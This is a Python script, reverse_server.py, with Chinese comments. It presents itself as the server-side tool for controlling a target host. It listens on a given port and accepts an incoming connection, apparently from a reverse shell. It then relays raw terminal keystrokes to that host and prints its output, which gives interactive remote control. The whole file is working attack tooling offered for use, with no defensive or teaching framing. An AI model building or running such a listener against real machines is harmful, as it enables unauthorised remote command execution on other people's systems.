#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   reverse_server.py
@Time    :   2022/04/19 17:28:43
@Author  :   willingboy 
@Contact :   willingboys@gmail.com
@Desc    :   控制目标主机公网服务器运行脚本
'''
import os
import sys
import tty
import socket
import termios
import threading

#全局TCP连接状态
CONN_ONLINE=False

def log(content):
    print(f'\033[0;42mWARNING: {content}\033[0m',flush=True)

def getch():
    '''
    禁止本地回显，实现输入先发送到远端，再返回代表输出成功
    '''
    FD = sys.stdin.fileno()
    OLD_SETTINGS = termios.tcgetattr(FD)
    try:
        tty.setraw(sys.stdin.fileno())
        ch = sys.stdin.buffer.read(1)
    finally:
        termios.tcsetattr(FD, termios.TCSADRAIN, OLD_SETTINGS)
    return ch

def recv_daemon(conn):
    global CONN_ONLINE
    while CONN_ONLINE:
        try:
            tmp = conn.recv(1024)
            if tmp:
                sys.stdout.buffer.write(tmp)
                sys.stdout.flush()
            else:
                break
        except socket.error:
            log("远端连接断开....")
            CONN_ONLINE=False
            break
        except:
            pass

def nearTTY(port):
    global CONN_ONLINE
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', port))
    sock.listen(1)

    conn, addr = sock.accept()
    conn.setblocking(True)
    CONN_ONLINE = True
    log(f'建立连接: IP:{addr[0]} PORT:{addr[1]}')
    p=threading.Thread(target=recv_daemon,args=(conn,),daemon=False)
    p.start()
    while CONN_ONLINE:
        ch=getch()
        try:
            ch and conn.send(ch)
        except socket.error:
            log('远程中断....')
            break
        except KeyboardInterrupt:
            log("本地连接中断....")
            break
    conn.close()
    sock.close()


if __name__=='__main__':
    if len(sys.argv)==2 and sys.argv[1].isdigit():
        nearTTY(int(sys.argv[1]))
    else:
        print("使用参数:")
        print(f'{" "*3}python {os.path.basename(sys.argv[0])} [port]')